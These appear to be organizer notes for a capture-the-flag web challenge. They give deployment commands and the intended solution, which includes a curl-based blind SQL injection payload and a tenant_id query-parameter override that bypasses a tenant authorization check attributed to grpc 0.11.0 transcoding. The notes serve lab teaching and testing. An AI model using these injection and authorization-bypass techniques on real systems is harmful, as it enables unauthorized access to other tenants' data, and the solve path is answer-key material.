# DuckExchange organizer notes

Do not distribute source code, `Dockerfile`, `docker-compose.yml`, `nginx.conf`,
or this file to players. The only player-facing material is `README.md` and the
deployed URL.

The challenge is a real Phoenix + Ecto/Postgres app with grpc `0.11.0`
HTTP-transcoded document service. Nginx exposes a single black-box HTTP port.
The Initech account is seeded with an unguessable password and is not intended
to be accessed through the login form.
Players must self-register an Acme analyst identity before they can authenticate.
`/` is a public DuckExchange landing page (description + Sign up / Sign in / Inbox nav).
`GET /login` holds the sign-in form. After a successful email/password login,
the app redirects to a fake OTP page and issues the trusted `tv_session` cookie
scoped to `Path=/otp`. No OTP is ever sent or accepted. The OTP endpoint always
fails and rate-limits after five attempts, so brute forcing OTP codes is
intentionally not part of the solution. The OTP page contains no links to inbox
or docs, so browsers do NOT auto-send the `Path=/otp` cookie to `/inbox`.
Players must capture `tv_session` in Burp (login `Set-Cookie`) and manually
attach `Cookie: tv_session=...` when requesting `/inbox`.

## Deploy

From this lab directory, start the container. The flag is deliberately mounted
as a Docker secret rather than exposed through container environment metadata:

```sh
docker compose up -d --build
```

Check the instance:

```sh
curl http://127.0.0.1:4000/
curl http://127.0.0.1:4000/login
curl -i http://127.0.0.1:4000/inbox
```

The flag is read from the mounted secret at runtime by the document service and
is not stored in SQL-visible document rows. For per-team isolation, run one
Compose project and database volume per team.

## Intended path

1. Register an analyst account with name, email, and a password meeting the
   displayed complexity policy (`/register` -> redirects to `/login`).
2. Log in with the registered email/password (`POST /login`). The app redirects
   to `/otp` and sets `Set-Cookie: tv_session=...; Path=/otp`. The OTP page has
   no clickable endpoints.
3. In Burp, capture the `tv_session` value from the login response. Manually send
   it as `Cookie: tv_session=...` to `GET /inbox` (`/notifications` is a compat
   alias). Browser-only navigation to `/inbox` returns `403 Access denied` because the cookie
   is `Path=/otp` scoped.
4. In the inbox dashboard HTML, find the unused inline JS constant
   `const DOCS_PATH = "/docs/";` (never fetched, no `href="/docs/"` link).
   Discover the published docs directory at `/docs/`. Read
   `/docs/build/mix.lock` to identify the vulnerable grpc dependency, read
   `/docs/build/schema.sql` for table and column names, download
   `/docs/descriptors/tenantexchange.protoset`, and identify the HTTP-transcoded
   document route.
5. Read `/inbox` to discover Acme document API links and the external
   delivery reference `IR-4472`.
6. Use `/exchange/lookup?q=IR-4472` as a boolean routing oracle (send the manual
   `tv_session` cookie). The lookup query is intentionally vulnerable to blind
   SQL injection and can recover the restricted Initech document UUID one
   character at a time, but not the flag body directly.
7. Confirm that changing the tenant path directly returns `403`.
8. Override the protobuf `tenant_id` through query-parameter precedence while
   keeping the authorized tenant in the URL path.

Example solve:

```sh
# Use a browser for the CSRF-protected registration/login, or script the form token.
# After login redirects to /otp, copy the tv_session cookie (Path=/otp) from Burp.
# Browsers will NOT auto-send it to /inbox; attach it manually:

curl -H 'Cookie: tv_session=MANUAL_VALUE' http://127.0.0.1:4000/inbox

curl http://127.0.0.1:4000/docs/build/mix.lock
curl http://127.0.0.1:4000/docs/descriptors/tenantexchange.protoset -o tenantexchange.protoset
protoc --decode_raw < tenantexchange.protoset

curl -H 'Cookie: tv_session=MANUAL_VALUE' \
  "http://127.0.0.1:4000/exchange/lookup?q=missing%25%27%20OR%20substring(doc_id::text,1,1)=%27a%27--"

curl -H 'Cookie: tv_session=MANUAL_VALUE' \
  'http://127.0.0.1:4000/api/v1/tenants/acme-corp/documents/<initech-document-uuid>?tenant_id=initech-inc'
```

The root cause is grpc `0.11.0` HTTP transcoding merging path bindings first and
then query parameters for `body: ""` routes. The guard checks the pre-transcode
path tenant from Cowboy route bindings, while the service handler trusts the
post-transcode protobuf request.

## Reset

Reset the database and sessions:

```sh
docker compose down -v
docker compose up -d --build
```
